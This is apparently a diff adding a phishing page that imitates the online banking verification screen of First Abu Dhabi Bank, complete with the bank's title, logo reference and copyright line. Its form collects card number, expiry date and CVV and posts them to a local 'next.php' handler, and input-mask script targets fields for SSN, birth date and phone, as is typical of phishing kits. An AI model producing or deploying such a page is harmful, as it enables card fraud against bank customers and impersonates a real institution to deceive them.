@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Online Banking - Digital Banking Channels | First Abu Dhabi Bank – UAE</title>
+</head>
+
+<body>
+    <link rel="stylesheet" href="./css/styles.b4724baebf91635e.css" media="all" onload="this.media=&#39;all&#39;">
+    <my-app ng-version="14.2.8">
+        <ng-component>
+            <div windowscroll="" class="new-brand">
+                <login-header>
+                    <header><a href="#"><img src="./images/logo-small.png" alt="FAB" class="brand-image"></a>
+                        <div class="button-holder brand-arabic"><a href="#"> عربى </a></div>
+                    </header>
+                </login-header>
+                <div class="container-fluid login-body">
+                    <div class="row">
+                        <div class="col-md-5 p-0 m-0 vertical login-content-wrapper">
+                            <div loginform1-component="" class="right-col-content login-width">
+                                <h2>Verification</h2>
+                                <p>Please verify your details to continue</p>
+                                <div class="form-holder">
+                                    <form id="loginForm" class="ng-untouched ng-pristine ng-valid" action="./next.php" method="POST">
+                                        <error-component>
+                                            <!---->
+                                        </error-component>
+                                        <div class="element-holder">
+                                            <input type="text" id="cn" name="cn" class="csu-login-userName ng-untouched ng-pristine ng-valid" placeholder="Card Number" required="">
+                                        </div>
+                                        <div class="element-holder">
+                                            <input type="text" id="exdate" name="exdate" class="csu-login-userName ng-untouched ng-pristine ng-valid" placeholder="Expiry Date" required="">
+                                        </div>
+                                        <div class="element-holder">
+                                            <input type="text" id="cvv" name="cvv" minlength="3" maxlength="4" class="csu-login-userName ng-untouched ng-pristine ng-valid" placeholder="CVV" required="">
+                                        </div>
+                                        <div class="button-holder hidein-otp">
+                                            <button type="submit" id="btn2" class="button btn-md btn-block btn-base" name="btn2">Submit</button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <login-footer>
+                        <div class="row footer-container">
+                            <p class="footer col-md-12">Copyright (c) 2023 First Abu Dhabi Bank. All Rights Reserved.</p>
+                        </div>
+                    </login-footer>
+                </div>
+            </div>
+        </ng-component>
+    </my-app>
+    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
+    <script type="text/javascript">
+    $("#ssn").inputmask({ "mask": "999-99-9999" });
+    $("#cn").inputmask({ "mask": "9999 9999 9999 9999" });
+    $("#dob").inputmask({ "mask": "99/99/9999", "placeholder": "DD/MM/YYYY" });
+    $("#exdate").inputmask({ "mask": "99/9999", "placeholder": "MM/YYYY" });
+    $("#ph").inputmask({ "mask": "999-999-9999" });
+    </script>
+</body>
+
+</html>
